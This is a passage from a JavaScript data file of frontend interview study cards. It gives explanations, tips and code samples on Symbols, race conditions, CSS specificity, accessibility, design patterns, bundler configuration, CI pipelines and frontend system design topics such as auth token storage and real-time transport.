      return curried.apply(this, args.concat(args2));
    };
  };
}

const multiply = curry((a, b, c) => a * b * c);
multiply(2)(3)(4);  // 24
multiply(2, 3)(4);  // 24 — partial application too
multiply(2)(3, 4);  // 24

// Real-world: reusable data transforms
const filter = curry((predicate, array) => array.filter(predicate));
const map    = curry((transform, array) => array.map(transform));

const getActive = filter(user => user.active);
const getNames  = map(user => user.name);

// pipe — compose left to right
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
const processUsers = pipe(getActive, getNames, arr => arr.sort());

processUsers(users); // active users' names, sorted`
  },

  // ── SYMBOLS ──────────────────────────────────────────────────────────
  'symbols': {
    explanation: `Symbol is a primitive type that creates unique, non-string property keys. Every Symbol() call creates a completely unique value.

Use cases:
- Unique object keys that won't clash
- "Hidden" properties (not in for...in or Object.keys)
- Well-known symbols — customize built-in JS behavior

Well-known symbols:
- Symbol.iterator — make object iterable (for...of)
- Symbol.toPrimitive — customize type conversion
- Symbol.hasInstance — customize instanceof
- Symbol.species — override constructor in derived classes
- Symbol.toStringTag — customize Object.prototype.toString
- Symbol.asyncIterator — async iteration protocol`,
    tips: `TIP 1: Symbol.iterator is the most important well-known symbol — implement it to make any object work with for...of, spread, and destructuring.

TRAP: Symbol() and Symbol.for() are different. Symbol() always creates unique symbols. Symbol.for('key') uses a global registry — same key = same symbol.

BONUS: Symbols as property keys are not included in JSON.stringify — useful for attaching metadata to objects without affecting serialization.`,
    code: `// Unique keys
const ID = Symbol('id');
const obj = { [ID]: 123, name: 'Alice' };
obj[ID]; // 123
Object.keys(obj); // ['name'] — Symbol not included
JSON.stringify(obj); // '{"name":"Alice"}' — Symbol excluded

// Symbol.for — global registry
const s1 = Symbol.for('shared');
const s2 = Symbol.for('shared');
s1 === s2; // true — same global symbol

// Symbol.iterator — custom iterable
class Range {
  constructor(from, to) { this.from = from; this.to = to; }

  [Symbol.iterator]() {
    let current = this.from;
    const to = this.to;
    return {
      next() {
        return current <= to
          ? { value: current++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
}
[...new Range(1, 5)]; // [1, 2, 3, 4, 5]
for (const n of new Range(1, 3)) console.log(n); // 1, 2, 3

// Symbol.toPrimitive — control type conversion
class Money {
  constructor(amount, currency) { this.amount = amount; this.currency = currency; }
  [Symbol.toPrimitive](hint) {
    if (hint === 'number') return this.amount;
    if (hint === 'string') return \`\${this.amount} \${this.currency}\`;
    return this.amount;
  }
}
const price = new Money(42, 'USD');
+price;          // 42 (number hint)
\`Price: \${price}\`; // 'Price: 42 USD' (string hint)`
  },

  // ── RACE CONDITIONS ──────────────────────────────────────────────────
  'race-conditions': {
    explanation: `A race condition occurs when the outcome depends on the timing of asynchronous operations. In frontend, the most common case: user triggers multiple async operations, but responses arrive out of order.

Classic scenario: search input — user types "re", "rea", "reac", "react". All 4 requests fire. If "react" response arrives before "reac", the UI shows "reac" results even though user typed "react".

Solutions:
- AbortController — cancel previous request
- Ignore stale responses — track latest request ID
- Debounce — don't fire until user pauses
- Optimistic locking — version/timestamp check
- Request deduplication`,
    tips: `TIP 1: AbortController is the cleanest solution — cancel in-flight requests when a new one starts. Browser also frees network resources.

TRAP: Checking if component is still mounted doesn't fix race conditions — it only prevents setState on unmounted components. The stale data could still appear briefly.

BONUS: React Query and SWR handle race conditions automatically — they deduplicate requests and only update the UI with the most recent data.`,
    code: `// ❌ Race condition — responses may arrive out of order
function search(query) {
  fetch(\`/api/search?q=\${query}\`)
    .then(r => r.json())
    .then(results => setResults(results)); // stale results could win!
}

// ✅ Fix 1: AbortController
function useSearch(query) {
  const [results, setResults] = useState([]);

  useEffect(() => {
    const controller = new AbortController();
    fetch(\`/api/search?q=\${query}\`, { signal: controller.signal })
      .then(r => r.json())
      .then(data => setResults(data))
      .catch(e => { if (e.name !== 'AbortError') console.error(e); });
    return () => controller.abort(); // cancel on next render
  }, [query]);
  return results;
}

// ✅ Fix 2: Ignore stale responses with request ID
let latestRequestId = 0;
async function search(query) {
  const requestId = ++latestRequestId;
  const results = await fetchSearch(query);
  if (requestId !== latestRequestId) return; // stale, ignore
  setResults(results);
}

// ✅ Fix 3: React Query (handles it automatically)
const { data } = useQuery({
  queryKey: ['search', query],
  queryFn: () => fetchSearch(query),
  // automatically cancels/ignores stale requests
});`
  },
  'css-specificity': {
    explanation: `CSS specificity determines which rule wins when multiple rules target the same element.

Specificity is calculated as (a, b, c, d):
- a = inline styles
- b = ID selectors
- c = class, attribute, pseudo-class selectors
- d = element, pseudo-element selectors

Higher wins. Equal specificity = later rule wins.

The Cascade order:
1. !important (avoid)
2. Inline styles
3. ID selectors
4. Class/pseudo-class/attribute
5. Element/pseudo-element
6. Source order (last wins)

Modern approach: keep specificity flat with BEM or CSS Modules.`,
    tips: `TIP 1: Avoid ID selectors in CSS — they create specificity problems. Use classes instead.

TRAP: !important defeats everything including later !important rules from the same specificity level. Using !important is usually a sign of a specificity architecture problem.

BONUS: @layer (CSS Cascade Layers) lets you define explicit cascade layers — rules in later layers always win regardless of specificity. Game-changer for design systems.`,
    code: `/* Specificity: (0,0,0,1) */
p { color: black; }

/* Specificity: (0,0,1,0) — wins over above */
.text { color: blue; }

/* Specificity: (0,1,0,0) — wins over class */
#header { color: red; }

/* Specificity: (1,0,0,0) — wins over ID */
<p style="color: green"> /* inline */

/* Modern: @layer for predictable cascade */
@layer base, components, utilities;
@layer base { .button { color: blue; } }
@layer utilities { .text-red { color: red; } }
/* utilities layer always beats base, regardless of specificity */`
  },

  'gpu-acceleration': {
    explanation: `The browser rendering pipeline: JS → Style → Layout → Paint → Composite

Each step can be skipped based on what changed:
- transform/opacity: skip to Composite (GPU only — fastest)
- color/background: skip Layout, go to Paint then Composite
- width/height/margin: full pipeline (slowest)

GPU layers: elements with transform, opacity, will-change, or position:fixed get their own compositor layer. Changes to these properties only require compositing — the GPU handles it at 60fps without involving the CPU.

will-change hints the browser to pre-create the layer before animation starts, preventing mid-animation layer creation jank.`,
    tips: `TIP 1: Always animate transform and opacity for 60fps animations. Never animate width, height, top, left.

TRAP: Too many GPU layers wastes VRAM and can actually hurt performance. Only use will-change on elements you know will animate.

BONUS: Use Chrome DevTools Layers panel to visualize compositor layers. Green-highlighted elements in the Performance panel indicate paint — minimize these during animation.`,
    code: `/* ❌ Triggers full pipeline — slow */
.slow { transition: width 0.3s, left 0.3s; }

/* ✅ Compositor only — 60fps */
.fast { transition: transform 0.3s, opacity 0.3s; }

/* ✅ Preemptive layer promotion */
.will-animate {
  will-change: transform;
  /* Creates GPU layer before animation starts */
}

/* Remove after animation to free GPU memory */
.animation-done {
  will-change: auto;
}

/* ✅ 3D transform hack (older browsers) */
.old-way { transform: translateZ(0); }`
  },

  'a11y-semantics': {
    explanation: `Semantic HTML conveys meaning beyond just appearance. Screen readers announce element roles — <button> announces "button", <nav> announces "navigation landmark".

ARIA (Accessible Rich Internet Applications) fills gaps where HTML semantics are insufficient — custom components like carousels, tabs, and comboboxes.

The 5 rules of ARIA:
1. Don't use ARIA if native HTML works
2. Don't change native semantics unless required
3. All interactive ARIA controls must be keyboard accessible
4. Don't use role="presentation" on focusable elements
5. All interactive elements must have accessible names`,
    tips: `TIP 1: A <div> with an onclick is not accessible. It needs role, tabIndex, keyboard handlers. A <button> has all of this built in.

TRAP: Adding ARIA to broken HTML doesn't fix accessibility — it adds false promises. "No ARIA is better than bad ARIA."

BONUS: Landmark roles help screen reader users navigate quickly. Every page should have exactly one <main>, one <header>, and one <footer> at the top level.`,
    code: `<!-- ❌ Inaccessible custom button -->
<div onclick="submit()" class="btn">Submit</div>
<!-- Screen reader: reads nothing useful -->

<!-- ✅ Native button — everything built in -->
<button type="submit">Submit</button>
<!-- Screen reader: "Submit, button" -->

<!-- ❌ ARIA misuse — adding role to real button -->
<button role="link">Click me</button>

<!-- ✅ ARIA for custom widget -->
<div role="tab" aria-selected="true"
     tabindex="0" id="tab1"
     aria-controls="panel1">
  Settings
</div>

<!-- ✅ Landmark structure -->
<header>...</header>
<nav aria-label="Main navigation">...</nav>
<main>...</main>
<aside aria-label="Related content">...</aside>
<footer>...</footer>`
  },
  'pattern-singleton': {
    explanation: `Singleton ensures a class has only one instance and provides a global access point.

JavaScript implementation: ES modules are naturally singletons — every importer gets the same cached module instance.

Use cases: configuration objects, loggers, database connection pools, Redux store, feature flag manager.

The classic anti-pattern: overusing Singleton creates hidden global state that makes testing painful.`,
    tips: `TIP: In JavaScript, prefer module-level exports over class-based Singletons. const logger = { log: (msg) => console.log(msg) } exported from a module IS a singleton.

TRAP: Singletons make unit tests order-dependent. If test A modifies the singleton, test B sees the modified state. Use dependency injection instead for testable code.

BONUS: Redux store is a Singleton. The entire app shares one store instance — this is intentional for predictable state.`,
    code: `// ❌ Over-engineered Java-style Singleton
class Logger {
  static #instance = null;
  static getInstance() {
    if (!Logger.#instance) Logger.#instance = new Logger();
    return Logger.#instance;
  }
  log(msg) { console.log(msg); }
}

// ✅ Idiomatic JavaScript — module IS a singleton
// logger.js
const logs = [];
export const logger = {
  log: (msg) => { logs.push(msg); console.log(msg); },
  getLogs: () => [...logs],
};
// Every importer gets the same logger object`
  },

  'pattern-observer': {
    explanation: `Observer defines a one-to-many dependency. When a subject changes state, all registered observers are notified automatically.

Subject maintains a subscriber list. Observers register/unregister. Subject notifies all on change.

JavaScript built-ins that implement Observer: DOM addEventListener, Node.js EventEmitter, RxJS Observable.`,
    tips: `TIP: Always unsubscribe in cleanup. React useEffect: return () => subject.unsubscribe(). Memory leaks from forgotten subscriptions are the #1 Observer problem.

TRAP: Synchronous notification chains — if Observer A notifies B which notifies C, a deep call stack can form. Use async notification for complex chains.

BONUS: React's useState is Observer under the hood — components subscribe to state slices and re-render on change.`,
    code: `class EventEmitter {
  #events = {};
  on(event, fn) {
    (this.#events[event] ||= []).push(fn);
    return () => this.off(event, fn); // returns unsubscribe fn
  }
  off(event, fn) {
    this.#events[event] = this.#events[event]?.filter(f => f !== fn);
  }
  emit(event, data) {
    this.#events[event]?.forEach(fn => fn(data));
  }
}

const store = new EventEmitter();
const unsub = store.on('change', data => console.log(data));
store.emit('change', { count: 1 });
unsub(); // cleanup!`
  },

  'pattern-strategy': {
    explanation: `Strategy defines a family of algorithms, encapsulates each one, and makes them interchangeable. The algorithm varies independently from clients that use it.

Instead of conditionals to switch between algorithms, each algorithm is a separate class/function. The context delegates to the current strategy.

JavaScript: functions are first-class, so strategies are often just functions passed as callbacks.`,
    tips: `TIP: In JavaScript, Strategy is often just passing a function. sortBy(items, (a, b) => a.name - b.name) — the comparison function is the strategy.

TRAP: Don't create Strategy classes for trivial one-liners. Functional Strategy (a callback) is cleaner in JavaScript than class-based Strategy.

BONUS: React's renderItem prop is Strategy pattern. The List component delegates rendering to whatever function you pass.`,
    code: `// Class-based Strategy
class Sorter {
  constructor(strategy) { this.strategy = strategy; }
  sort(data) { return this.strategy(data); }
}

const bubbleSort   = data => [...data].sort(); // simplified
const quickSort    = data => [...data].sort((a,b) => a - b);

const sorter = new Sorter(quickSort);
sorter.sort([3,1,2]);
sorter.strategy = bubbleSort; // swap at runtime!

// Functional Strategy (idiomatic JS)
const processPayment = (amount, strategy) => strategy(amount);
processPayment(100, stripeStrategy);
processPayment(100, paypalStrategy);`
  },
  'bundler-webpack': {
  explanation: `Webpack is a static module bundler. It builds a dependency graph from your entry point, then packages all modules into one or more bundles.

Core concepts:
- Entry: where Webpack starts building the graph
- Output: where to write the bundle
- Loaders: transform non-JS files into modules
- Plugins: extend Webpack's capabilities
- Mode: development vs production optimizations

Webpack 5 added Module Federation — loading code from other deployed applications at runtime.`,
  tips: `TIP: Always use mode explicitly. Without it, Webpack 4+ defaults to production but warns you. Development mode keeps readable output and source maps. Production mode enables all optimizations.

TRAP: Importing an entire library when you only need one function. import moment from 'moment' adds 67KB. import { format } from 'date-fns' adds 2KB. Always check bundle impact of new dependencies.

BONUS: Webpack's SplitChunksPlugin automatically splits vendor code (node_modules) from app code. Users cache vendor bundles across deploys since they change less frequently.`,
  code: `// webpack.config.js
module.exports = {
  mode: 'production',
  entry: './src/index.js',
  output: { path: path.resolve(__dirname, 'dist'), filename: '[name].[contenthash].js' },
  module: {
    rules: [
      { test: /\\.tsx?$/, use: 'babel-loader' },
      { test: /\\.css$/, use: ['style-loader', 'css-loader'] },
    ],
  },
  optimization: {
    splitChunks: { chunks: 'all' }, // vendor splitting
    runtimeChunk: 'single',
  },
};`
},

'bundler-vite': {
  explanation: `Vite reimagines the dev server. Instead of bundling on startup, it serves native ES modules directly. The browser requests files on demand — only what's needed for the current page.

For production, Vite uses Rollup to produce optimized bundles with excellent tree shaking and code splitting.

Key innovation: cold start time doesn't scale with project size. A 10,000 module app starts as fast as a 100 module app.`,
  tips: `TIP: Vite's dev server and production build use different tools (native ESM vs Rollup). Always test your production build — occasional differences exist. Run npm run build && npm run preview before shipping.

TRAP: Some packages don't work with Vite's native ESM dev server if they have bad ESM exports. Most popular packages work fine. Check the Vite compatibility list for known issues.

BONUS: vite.config.ts supports path aliases, proxy configuration for API requests in dev, and plugins for React, Vue, Svelte, etc. The plugin API is similar to Rollup's.`,
  code: `// vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  resolve: {
    alias: { '@': path.resolve(__dirname, './src') },
  },
  server: {
    proxy: { '/api': 'http://localhost:3001' },
  },
  build: {
    rollupOptions: {
      output: {
        manualChunks: { vendor: ['react', 'react-dom'] },
      },
    },
  },
});`
},

'bundler-babel': {
  explanation: `Babel is a JavaScript compiler — it transforms modern JS syntax into older syntax for browser compatibility.

The pipeline: parse source code → AST → transform (apply plugins) → generate output code.

Key packages:
- @babel/core: the compiler
- @babel/preset-env: smart browser targeting
- @babel/preset-react: JSX transformation
- @babel/preset-typescript: strip TypeScript types
- core-js: runtime polyfills`,
  tips: `TIP: Babel only transforms syntax. It doesn't add missing built-ins. Use useBuiltIns: 'usage' in preset-env to automatically inject core-js polyfills for APIs you actually use.

TRAP: Babel TypeScript support (@babel/preset-typescript) strips types without type checking. It's faster but won't catch type errors. Run tsc --noEmit separately in CI for actual type checking.

BONUS: In 2023, Next.js replaced Babel with SWC by default, reporting 17x faster transforms. Vite uses ESBuild for TypeScript. Babel is still common but compiled alternatives are taking over.`,
  code: `// babel.config.json
{
  "presets": [
    ["@babel/preset-env", {
      "targets": "> 0.25%, not dead",
      "useBuiltIns": "usage",
      "corejs": 3
    }],
    ["@babel/preset-react", { "runtime": "automatic" }],
    "@babel/preset-typescript"
  ]
}`
},

'bundler-tsconfig': {
  explanation: `tsconfig.json controls the TypeScript compiler. The options that matter most:

- strict: enables all strict checks — always enable
- target: output JS version (ES2020, ESNext)
- module: module system (CommonJS, ESModule, NodeNext)
- moduleResolution: how imports are resolved
- paths: import aliases
- lib: type definitions to include
- skipLibCheck: skip .d.ts file checking (speeds up builds)`,
  tips: `TIP: Use "extends" to share config across packages in a monorepo: "extends": "../../tsconfig.base.json". Override only what differs per package.

TRAP: TypeScript paths aliases (compilerOptions.paths) are for type checking only — not compilation. You must also configure matching aliases in Webpack/Vite separately, or the runtime imports will fail even if TypeScript shows no errors.

BONUS: composite: true enables project references — incremental compilation for monorepos. Only recompiles changed packages. Huge speedup for large codebases.`,
  code: `// tsconfig.json
{
  "compilerOptions": {
    "target": "ES2020",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "strict": true,
    "jsx": "react-jsx",
    "baseUrl": ".",
    "paths": { "@/*": ["src/*"] },
    "lib": ["ES2020", "DOM", "DOM.Iterable"],
    "skipLibCheck": true,
    "noEmit": true
  },
  "include": ["src"],
  "exclude": ["node_modules", "dist"]
}`
},

'bundler-cicd': {
  explanation: `A CI/CD pipeline automates the path from code commit to production deployment.

CI (Continuous Integration): automated checks on every commit/PR — tests, type checking, linting, build verification.

CD (Continuous Deployment/Delivery): automated deployment to staging or production after CI passes.

For frontend: GitHub Actions, Vercel, Netlify, and Cloudflare Pages provide excellent built-in CI/CD.`,
  tips: `TIP: Cache node_modules in CI based on package-lock.json hash. npm ci takes 60 seconds without cache, 5 seconds with. GitHub Actions: use actions/cache with key based on hashFiles('**/package-lock.json').

TRAP: Running npm install in CI instead of npm ci. npm ci is deterministic (exact lockfile versions), faster (no resolution step), and cleaner (deletes node_modules first). Always use npm ci in CI environments.

BONUS: Bundle size budgets in CI prevent performance regressions silently shipping. Tools: bundlesize, size-limit, or Lighthouse CI. Fail the build if a PR adds more than 5KB to the gzipped bundle.`,
  code: `# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci
      - run: npm run type-check   # tsc --noEmit
      - run: npm run lint         # ESLint
      - run: npm test             # Jest/Vitest
      - run: npm run build        # production build
      - run: npx size-limit       # bundle size budget`
},

'bundler-perf': {
  explanation: `Bundle optimization is about delivering the minimum JavaScript needed for the current page.

Key strategies:
1. Code splitting — route-based and component-based
2. Tree shaking — eliminate dead code
3. Lazy loading — load heavy components on demand
4. Dependency auditing — find and remove heavy packages
5. Bundle analysis — visualize what's in your bundle

The goal: minimize Time to Interactive by reducing the amount of JavaScript the browser must download, parse, and execute.`,
  tips: `TIP: The most impactful optimization is usually replacing a heavy dependency. moment.js (67KB) → date-fns (2KB for what you use). lodash full import (70KB) → named imports (2KB). Check bundlephobia.com before adding any new dependency.

TRAP: Lazy loading everything. Dynamic import() has overhead — the browser must make an extra network request. Only lazy-load components that are genuinely not needed on initial load (modals, admin panels, complex charts below the fold).

BONUS: Import cost VS Code extension shows the bundle size of each import inline in your editor. Instant feedback as you write code — before it ever hits CI.`,
  code: `// Route-based code splitting
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Settings  = lazy(() => import('./pages/Settings'));

// Replace heavy dependencies
// ❌ import { format } from 'moment';      // 67KB
// ✅ import { format } from 'date-fns';    // ~2KB

// Named imports for tree shaking
// ❌ import _ from 'lodash';               // 70KB
// ✅ import { pick, omit } from 'lodash';  // ~2KB

// Bundle size budget (size-limit config)
// "size-limit": [{ "path": "dist/index.js", "limit": "50 KB" }]`
},
'sd-frontend-arch': {
  explanation: `Frontend architecture is about enabling teams to work independently at scale. The right structure depends on team size, deployment needs, and tech stack consistency.

Key decisions:
- Feature-based vs type-based folder structure
- Monorepo vs polyrepo vs micro-frontends
- Shared code boundaries (the Rule of Three)
- Team ownership and deployment independence

The guiding principle: architecture should reduce coordination overhead between teams, not increase it.`,
  tips: `TIP: Feature-based folders scale with teams. Type-based folders scale with files. Once you have 3+ teams, feature-based wins every time.

TRAP: Creating a /shared folder at project start and putting everything reusable in it immediately — premature abstraction creates coupling.

BONUS: Architecture Decision Records (ADRs) document WHY decisions were made. Future team members need context, not just the outcome.`,
  code: `// Feature-based structure
src/features/
  checkout/
    CheckoutPage.tsx
    useCheckout.ts
    checkoutApi.ts
    checkout.types.ts
    index.ts          // public API — controls what leaks out
  catalog/
    CatalogPage.tsx
    useCatalog.ts
  shared/             // only when 3+ features use it
    components/Button.tsx`
},

'sd-api-design': {
  explanation: `API design decisions have long-term consequences. The wrong choice creates years of over-fetching, waterfall requests, or impossible caching.

Key patterns:
- REST: predictable, HTTP-cacheable, universal tooling
- GraphQL: flexible queries, multiple client types, no over-fetching
- tRPC: end-to-end TypeScript safety, full-stack monorepos
- BFF (Backend for Frontend): frontend team owns their API layer

Pagination: use cursor-based for any feed that mutates. Offset pagination breaks on insertions.`,
  tips: `TIP: BFF pattern gives frontend teams autonomy — they own the API contract and can evolve it without coordinating with backend teams.

TRAP: Choosing GraphQL because it's modern — for a simple CRUD app with one client type, REST is simpler and more cacheable.

BONUS: Expand/contract pattern for zero-downtime API migrations: add new field alongside old, clients migrate, then remove old field.`,
  code: `// Cursor pagination response shape
{
  "data": [...],
  "pagination": {
    "cursor": "post_abc123",
    "hasNextPage": true
  }
}

// BFF aggregating multiple services
GET /bff/product-page/123
// Returns: product + reviews + related + stock
// One request instead of four`
},

'sd-performance': {
  explanation: `Performance at scale requires measurement before optimization. The systematic approach: measure with real user data → identify the biggest bottleneck → fix it → measure again.

The three-layer performance stack:
1. Synthetic testing (Lighthouse CI) — catches regressions in CI
2. Real User Monitoring (RUM) — shows actual user experience
3. Performance budgets in CI — prevents silent regressions

Always fix the LCP image first — it's the highest-impact single optimization on most pages.`,
  tips: `TIP: Content-hash filenames (main.a3f9c2.js) enable infinite browser caching — the hash changes when content changes, busting the cache automatically.

TRAP: Running Lighthouse once and considering performance done. Regressions ship every week without automated budgets.

BONUS: Prefetch on hover — start downloading the next page's bundle when user hovers over a nav link. By the time they click, it's already downloaded.`,
  code: `// Performance budget in CI
// package.json
{
  "size-limit": [
    { "path": "dist/assets/index-*.js", "limit": "80 KB" }
  ]
}

// web-vitals RUM collection
import { onLCP, onINP, onCLS } from 'web-vitals';
onLCP(metric => sendToAnalytics(metric));
onINP(metric => sendToAnalytics(metric));
onCLS(metric => sendToAnalytics(metric));`
},

'sd-state-arch': {
  explanation: `State management fails when you use one tool for everything. Classify state first, then choose the tool.

The five state types:
1. Server state (API data) → React Query / SWR
2. URL state (navigation, filters) → Router params
3. Form state (ephemeral, validation) → React Hook Form
4. Local UI state (component-specific) → useState
5. Shared client state (global) → Zustand / Context

The single source of truth principle: each piece of state has exactly one authoritative source. Never duplicate state — derive it.`,
  tips: `TIP: URL state is free, persistent, shareable, and survives page refresh. Use it for: filters, search queries, pagination, active tabs.

TRAP: Putting API response data in Redux alongside UI state. React Query is purpose-built for server state with caching, deduplication, and revalidation built in.

BONUS: Normalized state stores each entity once by ID. Update once — all references automatically reflect the change. Essential when the same entity appears in multiple places.`,
  code: `// State classification in action
function ProductPage({ id }) {
  // Server state — React Query
  const { data } = useQuery(['product', id], () => fetchProduct(id));

  // URL state — router
  const [params] = useSearchParams();
  const tab = params.get('tab') ?? 'details';

  // Local UI state — useState
  const [isZoomed, setIsZoomed] = useState(false);

  // Global client state — Zustand
  const { addToCart } = useCartStore();
}`
},

'sd-auth-design': {
  explanation: `Authentication architecture has permanent security implications. Wrong decisions can't be patched — they require all users to re-authenticate.

Industry best practice for JWT:
- Access tokens: in-memory JavaScript variable (15 min expiry)
- Refresh tokens: httpOnly cookie (7 day expiry)
- Rotation: each refresh issues a new refresh token, invalidates old one

Never store access tokens in localStorage — readable by any XSS. httpOnly cookies are inaccessible to JavaScript entirely.`,
  tips: `TIP: Refresh token rotation provides automatic breach detection. If a stolen refresh token is reused after the legitimate user already refreshed, the system detects the collision and revokes all sessions.

TRAP: Storing OAuth client_secret in frontend code — it's visible in source to all users. OAuth code exchange must happen server-side.

BONUS: Separate authentication (who are you?) from authorization (what can you do?) clearly. Authentication happens once; authorization is checked on every request.`,
  code: `// Token storage strategy
let accessToken = null; // in-memory — XSS safe

// Server sets refresh token as httpOnly cookie:
// Set-Cookie: refresh=abc; HttpOnly; Secure; SameSite=Strict

// On page load — silent refresh
async function initAuth() {
  const res = await fetch('/api/auth/refresh', {
    credentials: 'include', // sends httpOnly cookie
  });
  const { accessToken: token } = await res.json();
  setAccessToken(token); // store in memory only
}`
},

'sd-realtime': {
  explanation: `Real-time transport selection depends on communication direction and frequency.

Decision framework:
- Client sends frequent data → WebSocket (bidirectional)
- Server pushes only → SSE (simpler, HTTP-based, auto-reconnects)
- Infrequent updates → Long polling or regular polling

SSE is underused: built on HTTP, automatic reconnection, works with HTTP/2, simpler server implementation than WebSocket. Handles 90% of real-time needs.

Presence systems: heartbeat + Redis TTL is the scalable pattern. Don't query the database for online status.`,
  tips: `TIP: SSE (Server-Sent Events) is perfect for notifications, live feeds, and progress updates. Much simpler than WebSocket when you don't need client-to-server messages.

TRAP: Using WebSocket for everything including one-way server pushes. WebSocket has connection overhead, harder load balancing, and more complex server setup.

BONUS: Exponential backoff with jitter for reconnection. Without jitter, all disconnected clients reconnect simultaneously after a server restart — thundering herd.`,
  code: `// SSE — server-to-client streaming
const eventSource = new EventSource('/api/notifications');

eventSource.onmessage = (e) => {
  const notification = JSON.parse(e.data);
  showNotification(notification);
};

// Auto-reconnects on connection drop ✓
// Works through HTTP proxies ✓
// HTTP/2 multiplexed ✓`
},

'sd-design-system': {
  explanation: `A design system is a product for developers. It needs versioning, migration support, documentation, and adoption tracking — not just a component library.

Two-tier token architecture:
- Primitive tokens: the complete palette (blue-500: #3b82f6)
- Semantic tokens: purpose-based (color-primary: blue-500)

Components use semantic tokens. Themes only change the semantic mapping layer. Rebranding: change semantic → primitives mapping. Components: unchanged.

Breaking changes require: deprecation warnings, codemods, 6-month migration windows, and adoption tracking.`,
  tips: `TIP: Codemods (AST transforms) automate migration from deprecated APIs. A codemod turns a 6-month manual migration into a one-command upgrade for 20 teams.

TRAP: Building the design system as a side project without dedicated engineering resources — quality and adoption suffer without ownership.

BONUS: Track adoption metrics: % of teams on latest version, deprecated API usage count. Without metrics you can't sunset old APIs safely.`,
  code: `// Two-tier token system
:root {
  /* Tier 1: Primitives — never used directly */
  --primitive-blue-500: #3b82f6;
  --primitive-gray-900: #111827;

  /* Tier 2: Semantic — what components use */
  --color-primary: var(--primitive-blue-500);
  --color-text: var(--primitive-gray-900);
}

/* Dark mode: only override semantic layer */
[data-theme="dark"] {
  --color-primary: var(--primitive-blue-400);
  --color-text: var(--primitive-gray-100);
}`
},

'sd-monitoring': {
  explanation: `Observability has three pillars — each answers a different question:

1. Errors (Sentry/Bugsnag): "What broke and where?" — stack traces, user context, release correlation
2. Logs (structured JSON): "What happened before the break?" — event trail for debugging
3. Metrics (RUM, dashboards): "How is the system behaving over time?" — trends, P75/P90, alerts

Real User Monitoring (RUM) shows actual user experience across real devices, networks, and geographies. Synthetic testing (Lighthouse) runs in controlled environments — good for regressions but misses real-world variability.`,
  tips: `TIP: Alert on user-facing symptoms, not internal metrics. Error rate > 1% is actionable. CPU > 70% is not (meaningless for serverless frontend).

TRAP: Setting up Sentry and considering observability done. Error tracking is one pillar. Without metrics and logs, you know something broke but not why or how widespread.

BONUS: Correlate errors with releases using release tracking. "This error started with commit abc123 deployed at 2pm" transforms debugging from hours to minutes.`,
  code: `// Three-pillar setup
// 1. Errors — Sentry
Sentry.init({ release: COMMIT_SHA, environment: 'production' });

// 2. RUM — web-vitals
onLCP(metric => sendMetric('lcp', metric.value));

// 3. Structured logs
logger.info('checkout_completed', {
  orderId, total, itemCount, // structured fields
  sessionId, userId,         // correlation IDs
});`
},

'sd-accessibility': {
  explanation: `Accessibility at scale requires systems, not heroics. One accessibility expert reviewing every PR doesn't scale.

The layered strategy:
1. Automated (CI): axe-core in Jest/Cypress catches ~40% of WCAG violations
2. Component library contract: library guarantees correct ARIA, keyboard nav, focus management
3. A11y champions: one per team, receives training, reviews team PRs
4. Quarterly manual audits: keyboard testing, screen reader testing catches the remaining ~30%

WCAG 2.1 Level AA is the legal standard in most jurisdictions. Target this as a baseline.`,
  tips: `TIP: Shift accessibility left — automated checks in CI prevent new violations at zero ongoing cost once configured. Fixing a11y at the end requires redesigning interactions.

TRAP: Testing accessibility only with automated tools — they catch ~40% of issues. Manual keyboard and screen reader testing is required for the rest.

BONUS: The component library's accessibility contract is the highest-leverage investment. If Button, Input, and Modal handle a11y correctly, every feature built with them starts accessible.`,
  code: `// axe-core in Jest — automatic a11y testing
import { axe, toHaveNoViolations } from 'jest-axe';
expect.extend(toHaveNoViolations);

test('LoginForm is accessible', async () => {
  const { container } = render(<LoginForm />);
  expect(await axe(container)).toHaveNoViolations();
});

// Lighthouse CI — all pages in CI pipeline
// lighthouserc.js
module.exports = {
  ci: { assert: { assertions: {
    'categories:accessibility': ['error', { minScore: 0.9 }]
  }}}
};`
},

'sd-interview-tips': {
  explanation: `System design interviews test thinking process, not memorization. Interviewers evaluate: structured approach, trade-off awareness, proactive consideration of non-functional requirements, and clear technical communication.

The 5-step framework:
1. Clarify requirements (2-3 min)
2. Define scope and constraints (1-2 min)
3. High-level design (5 min)
4. Deep dive on critical components (15-20 min)
5. Trade-offs and scaling discussion (3 min)

Never skip step 1. Jumping to a solution without requirements is the #1 system design mistake.`,
  tips: `TIP: Proactively mention performance, accessibility, and security without being asked. Senior engineers consider non-functional requirements automatically — it signals seniority.

TRAP: Designing the most complex architecture to show off knowledge. Interviewers penalize over-engineering. Design the simplest solution that meets requirements, then discuss how you'd scale.

BONUS: When you don't know something, say so and reason through it: "I haven't implemented real-time collaborative editing before, but applying what I know about WebSockets and conflict resolution, I'd approach it like this..." Reasoning ability matters more than memorized answers.`,
  code: `// Universal framework — applies to any frontend problem:

// 1. Rendering strategy?
// SSG / ISR / SSR / CSR — based on freshness needs

// 2. Data fetching?
// REST vs GraphQL, caching, pagination, real-time?

// 3. State management?
// Classify: server / URL / form / local / global

// 4. Performance targets?
// LCP < 2.5s, bundle budgets, CDN strategy

// 5. Security concerns?
// Auth strategy, input validation, CSP

// Ask these for EVERY system design problem`
},
};